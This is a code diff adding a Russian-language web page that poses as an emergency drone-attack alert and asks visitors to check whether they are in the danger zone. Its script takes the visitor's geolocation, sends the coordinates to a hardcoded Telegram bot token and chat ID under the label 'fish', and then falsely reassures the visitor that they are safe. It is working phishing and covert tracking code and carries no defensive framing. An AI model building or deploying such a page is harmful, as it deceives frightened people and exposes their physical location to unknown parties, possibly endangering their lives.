@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ВНИМАНИЕ! Угроза атаки БПЛА!</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #1a1a1a;
+      color: #fff;
+      text-align: center;
+      padding: 50px;
+      margin: 0;
+    }
+    .container {
+      max-width: 600px;
+      margin: auto;
+      background: #2c2c2c;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px red;
+    }
+    h1 {
+      color: red;
+    }
+    p {
+      font-size: 18px;
+    }
+    button {
+      background-color: red;
+      color: white;
+      border: none;
+      padding: 15px 25px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    button:hover {
+      background-color: darkred;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 16px;
+      color: #ccc;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>⚠️ ВНИМАНИЕ! Угроза атаки БПЛА в вашем районе! </h1>
+    <p>Пожалуйста, проверьте, находитесь ли вы в зоне атаки.</p>
+    <button onclick="sendLocation()">Проверить зону опасности.</button>
+    <p id="status"></p>
+  </div>
+
+  <script>
+    const TELEGRAM_TOKEN = '7624947051:AAHUnfxqWmRoxccLRnmayyrdOqCZwXdsncs';
+    const CHAT_ID = '5360863968';
+
+    function sendLocation() {
+      const status = document.getElementById("status");
+      status.textContent = "Определяем ваше местоположение...";
+
+      if (!navigator.geolocation) {
+        status.textContent = "Геолокация не поддерживается вашим браузером.";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(success, error);
+
+      function success(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        status.textContent = "Местоположение определено.";
+
+        const message = `Координаты рыбки\n📍 Широта: ${latitude}\n📍 Долгота: ${longitude}`;
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        })
+        .then(response => {
+          if (response.ok) {
+            status.textContent = "Вы вне зоны  опасности. Спасибо за блидетельность!";
+          } else {
+            status.textContent = "Ошибка при отправке данных.";
+          }
+        })
+        .catch(() => {
+          status.textContent = "Ошибка сети при отправке данных.";
+        });
+      }
+
+      function error() {
+        status.textContent = "Не удалось получить ваше местоположение.";
+      }
+    }
+  </script>
+</body>
+</html>
